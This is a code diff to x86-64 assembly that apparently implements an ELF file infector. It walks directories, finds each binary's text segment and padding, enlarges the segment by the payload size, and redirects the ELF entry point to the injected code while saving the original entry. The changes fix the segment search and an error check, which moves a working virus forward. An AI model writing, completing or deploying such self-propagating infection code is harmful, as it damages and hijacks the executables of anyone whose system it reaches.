@@ -1,4 +1,3 @@
-
 				default			rel
 				global			main
 main:
@@ -33,6 +32,12 @@ sc:
 
 				mov				qword[sc_glob],		rsp
 				add				qword[sc_glob],		24
+
+				mov				qword[rsp+0x20],		sc_end - sc
+				mov				qword[rsp+0x28],		sc_data_end - sc_data
+				mov				rax,					qword[rsp+0x20]
+				add				rax,					qword[rsp+0x28]
+				mov				qword[rsp+0x30],		rax
 
 				lea				rdi,					[sc_dir_1]
 				call			sc_proc_dir
@@ -147,7 +152,7 @@ sc_proc_entries:
 
 				call			sc_set_x_pad
 				cmp				rax,					0
-				jl				.unmap
+				jne				.unmap
 
 				call			sc_update_mem
 
@@ -173,23 +178,23 @@ sc_proc_entries:
 				pop				rbp
 				ret
 sc_update_mem:
-				mov				rdi,						qword[sc_glob]
-				mov				r8,							qword[rdi+0x50] ;hdrs.txt
-				mov				r9,							qword[rdi+0x48]	;hdrs.elf
+				mov				rdi,					qword[sc_glob]
+				mov				r8,						qword[rdi+0x50] ;hdrs.txt
+				mov				r9,						qword[rdi+0x48]	;hdrs.elf
 
-				mov				rdx,						qword[r8+0x10]
-				add				rdx,						qword[r8+0x28]
+				mov				rdx,					qword[r8+0x10]
+				add				rdx,					qword[r8+0x28]
 				mov				qword[sc_entry],		rdx
 				
-				mov				rdx,						qword[r9+0x18]
+				mov				rdx,					qword[r9+0x18]
 				mov				qword[sc_real_entry],	rdx
 				
-				mov				rdx,						qword[sc_entry]
-				mov				qword[r9+0x18],				rdx
-				
-				mov				rsi,						qword[rdi+0x30]
-				add				qword[r8+0x20],				rsi
-				add				qword[r8+0x28],				rsi
+				mov				rdx,					qword[sc_entry]
+				mov				qword[r9+0x18],			rdx
+			
+				mov				rsi,					qword[rdi+0x30]
+				add				qword[r8+0x20],			rsi
+				add				qword[r8+0x28],			rsi
 				
 				ret
 sc_set_x_pad:
@@ -247,11 +252,15 @@ sc_set_x_pad:
 sc_find_txt_seg:
 				mov				rdi,					qword[sc_glob]
 				mov				r8,						qword[rdi+0x48]; *hdrs.elf
+				mov				qword[rdi+0x50],		0
 
 				mov				rcx,					1
 				mov				rsi,					qword[rdi+0xc60]
 				add				rsi,					qword[r8+0x20]
 .loop:
+				cmp				qword[rdi+0x50],		0
+				jne				.set_nxt
+
 				cmp				rcx,					qword[r8+0x38]
 				je				.error
 
@@ -264,12 +273,14 @@ sc_find_txt_seg:
 				je				.inc
 
 				mov				qword[rdi+0x50],		rsi
- 				xor				rax,					rax
-				ret
 .inc:
 				inc				rcx
 				add				rsi,					56
 				jmp				.loop
+.set_nxt:				
+				mov				qword[rdi+0x58],		rsi
+ 				xor				rax,					rax
+				ret
 .error:
  				mov				rax,					-1
 				ret
